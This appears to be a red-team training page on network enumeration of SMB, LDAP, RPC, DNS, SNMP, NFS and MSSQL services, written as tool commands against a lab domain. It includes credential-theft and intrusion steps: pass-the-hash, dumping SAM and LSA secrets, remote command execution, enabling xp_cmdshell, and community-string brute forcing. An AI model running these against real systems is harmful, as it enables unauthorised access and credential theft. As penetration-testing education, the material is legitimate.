---
layout: training-page
title: "Network Enumeration — Red Team Academy"
module: "Reconnaissance"
tags:
  - smb
  - ldap
  - enumeration
  - crackmapexec
page_key: "recon-network-enum"
render_with_liquid: false
---

# Network Enumeration

## From Scanning to Enumeration

Scanning reveals what ports are open. Enumeration extracts useful information from those open services: usernames, share names, domain structure, policy settings, and configuration details. Network enumeration is the bridge between "I found open ports" and "I have enough context to exploit." Each protocol leaks different data — SMB reveals users and shares, LDAP reveals the entire AD schema, SNMP often exposes running processes and network topology.

![Network enumeration protocol map: SMB yields users/shares/hashes, LDAP yields full AD schema, SNMP yields topology and processes — each with corresponding tools and attack paths](/images/recon/network-enum-map.svg)  
*// network enumeration — protocol to data extracted and attack paths*

## SMB Enumeration

### CrackMapExec / NetExec

CrackMapExec (and its modern successor NetExec) is the Swiss Army knife of SMB/AD enumeration. It can spray credentials, enumerate shares, dump SAM, and execute commands — all at scale across entire subnets.

```
# Install:
sudo apt install crackmapexec
# Or NetExec (CME successor):
pip3 install netexec

# Unauthenticated enumeration — discover hosts and OS:
crackmapexec smb 192.168.56.0/24          # Enumerate all hosts
crackmapexec smb 192.168.56.10            # Single host info

# Output includes: IP, hostname, domain, OS, SMB signing status

# Authenticated enumeration with credentials:
crackmapexec smb 192.168.56.0/24 -u administrator -p 'P@ssw0rd'

# Hash-based authentication (Pass-the-Hash):
crackmapexec smb 192.168.56.0/24 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'

# Enumerate shares:
crackmapexec smb 192.168.56.10 -u 'guest' -p '' --shares
crackmapexec smb 192.168.56.10 -u administrator -p 'P@ssw0rd' --shares

# Enumerate users (requires authentication):
crackmapexec smb 192.168.56.10 -u administrator -p 'P@ssw0rd' --users

# Enumerate local groups:
crackmapexec smb 192.168.56.10 -u administrator -p 'P@ssw0rd' --local-groups

# Enumerate domain groups:
crackmapexec smb 192.168.56.10 -u administrator -p 'P@ssw0rd' --groups

# Enumerate logged-in sessions:
crackmapexec smb 192.168.56.10 -u administrator -p 'P@ssw0rd' --sessions

# Enumerate disks:
crackmapexec smb 192.168.56.10 -u administrator -p 'P@ssw0rd' --disks

# Check SMB signing (critical for relay attacks):
crackmapexec smb 192.168.56.0/24 --gen-relay-list unsigned_hosts.txt
# Hosts without SMB signing = relay attack candidates

# Execute commands (requires admin privs):
crackmapexec smb 192.168.56.10 -u administrator -p 'P@ssw0rd' -x 'whoami'
crackmapexec smb 192.168.56.10 -u administrator -p 'P@ssw0rd' -X 'Get-Process'

# Dump SAM database:
crackmapexec smb 192.168.56.10 -u administrator -p 'P@ssw0rd' --sam

# Dump LSA secrets:
crackmapexec smb 192.168.56.10 -u administrator -p 'P@ssw0rd' --lsa
```

### enum4linux-ng

The modern rewrite of enum4linux. Enumerates everything available from SMB/RPC/LDAP in a single run.

```
# Install:
sudo apt install enum4linux-ng

# Full enumeration (unauthenticated):
enum4linux-ng -A 192.168.56.10

# Flags:
# -A   All enumeration (recommended default)
# -U   Get userlist
# -G   Get grouplist
# -S   Get sharelist
# -P   Get password policy info
# -O   Get OS information
# -i   Get printer information
# -r   Enumerate users via RID cycling

# Authenticated enumeration:
enum4linux-ng -A -u administrator -p 'P@ssw0rd' 192.168.56.10

# Output formats:
enum4linux-ng -A 192.168.56.10 -oA enum4linux_output   # JSON + YAML output
enum4linux-ng -A 192.168.56.10 -oJ enum4linux.json     # JSON only

# Key output to look for:
# - Domain name and SID
# - User accounts and their RIDs
# - Groups and group memberships
# - Password policy (minimum length, complexity, lockout threshold)
# - Accessible shares (including SYSVOL, NETLOGON, IPC$)
# - OS version
```

### smbclient — Manual Share Access

```
# List shares (null session):
smbclient -L //192.168.56.10 -N           # -N = no password

# List shares (authenticated):
smbclient -L //192.168.56.10 -U 'administrator%P@ssw0rd'

# Connect to a share:
smbclient //192.168.56.10/SYSVOL -U 'domain\user%password'

# Inside smbclient:
smb: \> ls          # List directory
smb: \> get file.txt # Download file
smb: \> recurse ON  # Enable recursive listing
smb: \> ls          # List recursively

# Download entire share:
smbclient //192.168.56.10/Backups -U 'user%pass' -c 'prompt OFF; recurse ON; mget *'

# Mount share on Linux:
sudo mount -t cifs //192.168.56.10/SYSVOL /mnt/share -o 'username=user,password=pass,domain=DOM'
```

## LDAP Enumeration

LDAP (port 389/636) exposes the entire Active Directory database. Every object in AD — users, groups, computers, GPOs, trusts — is accessible via LDAP queries. Anonymous binds are sometimes allowed; at minimum, any domain user can query the full AD schema.

### ldapsearch

```
# Basic anonymous LDAP query:
ldapsearch -x -H ldap://192.168.56.10 -b '' -s base namingContexts
# Returns base DNs — tells you the domain structure

# Enumerate all domain users (requires authentication):
ldapsearch -x -H ldap://192.168.56.10 \
  -D 'cn=administrator,dc=sevenkingdoms,dc=local' \
  -w 'P@ssw0rd' \
  -b 'dc=sevenkingdoms,dc=local' \
  '(objectClass=user)' cn sAMAccountName mail

# Find all users with SPN set (kerberoastable):
ldapsearch -x -H ldap://192.168.56.10 \
  -D 'user@sevenkingdoms.local' -w 'password' \
  -b 'dc=sevenkingdoms,dc=local' \
  '(&(objectClass=user)(servicePrincipalName=*))' cn sAMAccountName servicePrincipalName

# Find users with Kerberos pre-auth disabled (AS-REP roastable):
ldapsearch -x -H ldap://192.168.56.10 \
  -D 'user@sevenkingdoms.local' -w 'password' \
  -b 'dc=sevenkingdoms,dc=local' \
  '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' cn

# Enumerate computers:
ldapsearch -x -H ldap://192.168.56.10 \
  -D 'user@domain.local' -w 'pass' \
  -b 'dc=domain,dc=local' \
  '(objectClass=computer)' cn operatingSystem

# Enumerate groups:
ldapsearch -x -H ldap://192.168.56.10 \
  -D 'user@domain.local' -w 'pass' \
  -b 'dc=domain,dc=local' \
  '(objectClass=group)' cn member

# Anonymous LDAP (some older DCs allow this):
ldapsearch -x -H ldap://192.168.56.10 \
  -b 'dc=domain,dc=local' \
  '(objectClass=user)' cn
```

### ldapdomaindump

```
# Dumps entire AD into HTML and JSON files — fast, visual:
pip3 install ldapdomaindump
# or: sudo apt install python3-ldapdomaindump

ldapdomaindump -u 'DOMAIN\user' -p 'password' 192.168.56.10
# Creates: domain_users.html, domain_groups.html, domain_computers.html,
#          domain_trusts.html, domain_policy.html, domain_users_by_group.html

# Opens nicely in a browser for quick AD mapping
```

## RPC Enumeration

```
# rpcclient — connect via null session or credentials:
rpcclient -U "" -N 192.168.56.10        # Null session
rpcclient -U "user%password" 192.168.56.10

# Inside rpcclient:
rpcclient $> srvinfo                    # Server info
rpcclient $> enumdomusers               # List all domain users
rpcclient $> enumdomgroups              # List domain groups
rpcclient $> querydominfo               # Domain info (password policy, etc.)
rpcclient $> queryuser 0x1f4            # Query user by RID (0x1f4 = 500 = Administrator)
rpcclient $> enumalsgroups domain       # Enumerate alias groups
rpcclient $> getdompwinfo               # Password policy
rpcclient $> netshareenum              # List shares
rpcclient $> netsharegetinfo share      # Share details

# RID cycling — enumerate users without a user list:
# RIDs 500-550 are built-in; domain users start at 1000
for i in $(seq 500 2000); do
  rpcclient -U "" -N 192.168.56.10 -c "queryuser $i" 2>/dev/null | \
    grep -i "User Name"
done

# lookupsids — resolve SID to name:
rpcclient $> lookupsids S-1-5-21-1234567890-1234567890-1234567890-500
```

## DNS Enumeration

### DNS Zone Transfers

```
# A misconfigured DNS server will hand over its entire zone database.
# This reveals all internal hostnames, IPs, and service naming conventions.

# Check zone transfer (dig):
dig axfr @ns1.targetcompany.com targetcompany.com
dig axfr @192.168.56.10 sevenkingdoms.local

# If successful: full zone data dumps — every A, CNAME, MX, SRV record
# Most modern servers reject unauthorized zone transfers, but internal
# DNS servers on corporate networks are often misconfigured

# dnsenum — automated zone transfer + brute force:
sudo apt install dnsenum
dnsenum --enum -f /usr/share/dnsenum/dns.txt targetcompany.com
dnsenum --dnsserver 192.168.56.10 sevenkingdoms.local

# dnsrecon:
sudo apt install dnsrecon
dnsrecon -d targetcompany.com -t axfr        # Zone transfer attempt
dnsrecon -d targetcompany.com -t std         # Standard enumeration
dnsrecon -d targetcompany.com -t brt -D /usr/share/wordlists/dnsmap.txt  # Brute
```

### Internal DNS with Known Credentials

```
># Query internal DNS from domain-joined context:

# All records from DC:
dig @192.168.56.10 sevenkingdoms.local ANY

# Find domain controllers:
dig @192.168.56.10 _ldap._tcp.sevenkingdoms.local SRV
dig @192.168.56.10 _kerberos._tcp.sevenkingdoms.local SRV

# Find all DCs:
nslookup -type=SRV _ldap._tcp.dc._msdcs.sevenkingdoms.local 192.168.56.10
```

## SNMP Enumeration

SNMP (UDP 161) with default community strings (`public`, `private`) leaks detailed device information: running processes, network interfaces, installed software, user accounts, and routing tables.

```
# snmpwalk — walk the entire OID tree:
sudo apt install snmp

snmpwalk -v2c -c public 192.168.56.10         # SNMPv2c with "public" community
snmpwalk -v1 -c public 192.168.56.10 system   # System OID branch only

# Useful OID branches:
# .1.3.6.1.2.1.25.4.2.1.2  → running processes
# .1.3.6.1.2.1.25.6.3.1.2  → installed packages
# .1.3.6.1.2.1.6.13.1.3    → TCP connections
# .1.3.6.1.2.1.4.20.1.1    → IP addresses
# .1.3.6.1.4.1.77.1.2.25   → Windows user accounts

# snmpwalk for running processes:
snmpwalk -v2c -c public 192.168.56.10 .1.3.6.1.2.1.25.4.2.1.2

# snmp-check — formatted SNMP enumeration:
sudo apt install snmp-check
snmp-check 192.168.56.10 -c public -v 2c

# onesixtyone — fast community string brute force:
sudo apt install onesixtyone
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 192.168.56.0/24
# Uses wordlist of community strings to find non-default ones

# hydra — SNMP community brute force:
hydra -P /usr/share/seclists/Discovery/SNMP/snmp.txt snmp://192.168.56.10
```

## NFS Enumeration

```
# NFS (port 111/2049) — check for world-readable exports:
sudo apt install nfs-common

# List NFS exports:
showmount -e 192.168.56.10

# If exports shown (e.g., /exports *), mount them:
sudo mkdir /mnt/nfs_share
sudo mount -t nfs 192.168.56.10:/exports /mnt/nfs_share
ls -la /mnt/nfs_share   # What's accessible?

# Check permissions — look for:
# - no_root_squash: root on attacker = root on NFS (UID 0 access)
# - world-readable: anyone can read without auth
```

## MSSQL Enumeration

```
># Impacket's mssqlclient:
pip3 install impacket
mssqlclient.py sa:password@192.168.56.23 -windows-auth

# Inside MSSQL:
SQL> SELECT @@version;                    # DB version
SQL> SELECT name FROM master..sysdatabases; # List databases
SQL> EXEC xp_cmdshell 'whoami';           # OS command execution (if enabled)
SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;  # Enable xp_cmdshell

# CrackMapExec for MSSQL:
crackmapexec mssql 192.168.56.23 -u sa -p password
crackmapexec mssql 192.168.56.23 -u sa -p password -q 'SELECT @@version'
crackmapexec mssql 192.168.56.23 -u sa -p password --local-auth
```

## Enumeration Priority by Port

| Port/Service | First Tool | Key Data |
| --- | --- | --- |
| 445/SMB | crackmapexec smb | Users, shares, OS, signing status |
| 389/LDAP | ldapdomaindump | Full AD structure, users, SPNs |
| 53/DNS | dig axfr | All hostnames + IPs, internal structure |
| 161/SNMP | snmp-check | Processes, software, interfaces |
| 135/RPC | rpcclient | Users (RID cycling), password policy |
| 2049/NFS | showmount | World-readable exports, root_squash |
| 1433/MSSQL | mssqlclient.py | Databases, xp_cmdshell, linked servers |

## Nmap Results Dashboard (Grafana)

`nmap-did-what` parses Nmap XML output into an SQLite database and visualizes it in a pre-configured Grafana dashboard. Useful for managing large scan datasets across multiple subnets and tracking scan history over time.

```
# Step 1: Run Nmap and save XML output
nmap -sV -sC -oX scan.xml 10.10.10.0/24

# Step 2: Clone and set up nmap-did-what
git clone https://github.com/hackertarget/nmap-did-what
cd nmap-did-what/data/

# Step 3: Parse XML into SQLite DB
python nmap-to-sqlite.py ../scan.xml
# Creates: nmap-did-what/data/nmap_results.db

# Step 4: Start Grafana container
cd ..
docker-compose up -d

# Step 5: Access dashboard
# URL: http://localhost:3000
# Default credentials: admin / admin

# Run multiple scans and import all — each gets a timestamp
# Use Grafana time filters to compare scans across dates
python nmap-to-sqlite.py scan1.xml
python nmap-to-sqlite.py scan2.xml
# Both scans visible in dashboard, filterable by time
```

## Key Resources

- `https://github.com/hackertarget/nmap-did-what` — nmap-did-what Grafana dashboard
- `https://github.com/Pennyw0rth/NetExec` — NetExec (CrackMapExec successor)
- `https://github.com/cddmp/enum4linux-ng` — enum4linux-ng
- `https://github.com/dirkjanm/ldapdomaindump` — ldapdomaindump
- `https://github.com/SecureAuthCorp/impacket` — Impacket toolkit
- `https://www.seclists.org` — SecLists wordlists (SNMP community strings, etc.)
